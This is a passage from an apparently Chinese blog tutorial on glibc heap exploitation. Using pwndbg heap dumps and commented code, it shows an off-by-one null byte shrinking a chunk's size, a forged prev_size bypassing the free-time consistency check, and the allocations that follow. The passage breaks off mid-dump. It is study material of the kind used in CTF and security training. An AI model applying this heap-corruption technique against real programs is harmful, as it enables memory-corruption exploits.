class="line"><span class="number">0x603320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span>      &lt;=chunk_c </span><br><span class="line"><span class="number">0x603330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603350</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">...</span><br><span class="line"><span class="number">0x603400</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603410</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span>      &lt;=barrier_chunk</span><br><span class="line"><span class="number">0x603440</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603460</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">....</span><br><span class="line"><span class="number">0x603500</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603510</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603520</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603530</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//这个就是由off-one-byte造成的。</span></span><br><span class="line"><span class="comment">//若存在off-one-byte，a里填数据，在n+1的字节处写入了\x00   </span></span><br><span class="line"><span class="comment">//0x603110:	0x0000000000000000	0x0000000000000211      &lt;=chunk_b</span></span><br><span class="line"><span class="comment">//chunk_b原本是上面这样的，由于有off-one-btye，变成了下面这样:</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span>      &lt;=chunk_a</span><br><span class="line"><span class="number">0x603010</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x603020</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span></span><br><span class="line">....</span><br><span class="line"><span class="number">0x603100</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x603110</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x0000000000000200</span>     &lt;=chunk_b</span><br><span class="line"><span class="number">0x603120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//chunk_b 的size由0x210变成了0x200，所以这样的话，下一个chunk就应该在b+0x1f0c = 0x603310 开始。</span></span><br><span class="line"><span class="comment">//在新版本的glibc中，free的时候增加了size == prev_size(next_chunk)的检查。，暂且将0x603310这里开始的这个chunk叫做fake_chunk。我。们要完善这个chunk，来bypass检测。</span></span><br><span class="line"><span class="comment">//0x603310~0x603317是fake_chunk的presize域。</span></span><br><span class="line"></span><br><span class="line">*(size_t*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"><span class="comment">//这样就绕过了size == prev_size(next_chunk)</span></span><br><span class="line"><span class="comment">//size是我要释放的chunk的size(从程序里看的出来，接下来要释放的是chunk_b。但是有由于有off-by-one漏洞，a刚好填写malloc_usable_size(a)这么多字节的数据的话，可以导致chunk_b的size域的低字节被覆盖成\x00，也就是由0x11变成了00)</span></span><br><span class="line"><span class="comment">//所以pre_size(next_chunk)要等于0x200，这里的next_chunk就是这个fake_chunk(0x603310开始)，它的pre_size就是这开始的8个字节。</span></span><br><span class="line"><span class="number">0x603310</span>:	<span class="number">0x0000000000000200</span>	<span class="number">0x0000000000000000</span>      &lt;==fake_chunk</span><br><span class="line"><span class="number">0x603320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span>      &lt;==chunk_c</span><br></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">heap</span></span><br><span class="line"><span class="attr">Top Chunk:</span> <span class="number">0x603540</span></span><br><span class="line"><span class="attr">Last Remainder:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x111</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x603110</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x211</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x603320</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x111</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x603430</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x111</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x603540</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x20ac1</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">free(b);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x603540</span></span><br><span class="line">Last Remainder: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603110</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x211</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603320</span> &#123;</span><br><span class="line">  prev_size = <span class="number">0x210</span>, </span><br><span class="line">  size = <span class="number">0x110</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603430</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603540</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x20ac1</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x603110</span> ◂— <span class="number">0x7ffff7dd1b78</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chunk_b:</span><br><span class="line"><span class="number">0x603110</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x211</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">chunk_b的size依旧是<span class="number">0x211</span>。</span><br></pre></td></tr></table></figure>
+<h3 id="0x04：bypass-size-chunk-prev-size-next-chunk"><a href="#0x04：bypass-size-chunk-prev-size-next-chunk" class="headerlink" title="0x04：bypass size(chunk) == prev_size(next_chunk)"></a>0x04：bypass size(chunk) == prev_size(next_chunk)</h3><h3 id="0x05-off-one-byte"><a href="#0x05-off-one-byte" class="headerlink" title="0x05:off-one-byte"></a>0x05:off-one-byte</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x603540</span></span><br><span class="line">Last Remainder: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603110</span> &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x200</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603310</span> &#123;</span><br><span class="line">  prev_size = <span class="number">0x200</span>, </span><br><span class="line">  size = <span class="number">0x0</span>, </span><br><span class="line">  fd = <span class="number">0x210</span>, </span><br><span class="line">  bk = <span class="number">0x110</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x603110</span> ◂— <span class="number">0x7ffff7dd1b78</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+<p>这样就把chunk_b的大小给变了</p>
+<h3 id="0x06-b1-malloc-0x100"><a href="#0x06-b1-malloc-0x100" class="headerlink" title="0x06 b1 = malloc(0x100);"></a>0x06 b1 = malloc(0x100);</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x603540</span></span><br><span class="line">Last Remainder: <span class="number">0x603220</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603110</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1d68</span> &lt;main_arena+<span class="number">584</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1d68</span> &lt;main_arena+<span class="number">584</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603220</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0xf1</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603310</span> &#123;</span><br><span class="line">  prev_size = <span class="number">0xf0</span>, </span><br><span class="line">  size = <span class="number">0x0</span>, </span><br><span class="line">  fd = <span class="number">0x210</span>, </span><br><span class="line">  bk = <span class="number">0x110</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x603220</span> ◂— <span class="number">0x7ffff7dd1b78</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x07-b2-malloc-0x80"><a href="#0x07-b2-malloc-0x80" class="headerlink" title="0x07 b2 = malloc(0x80);"></a>0x07 b2 = malloc(0x80);</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x603540</span></span><br><span class="line">Last Remainder: <span class="number">0x6032b0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603110</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x111</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1d68</span> &lt;main_arena+<span class="number">584</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1d68</span> &lt;main_arena+<span class="number">584</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603220</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x91</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6032b0</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, </span><br><span class="line">  size = <span class="number">0x61</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603310</span> &#123;</span><br><span class="line">  prev_size = <span class="number">0x60</span>, </span><br><span class="line">  size = <span class="number">0x0</span>, </span><br><span class="line">  fd = <span class="number">0x210</span>, </span><br><span class="line">  bk = <span class="number">0x110</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span 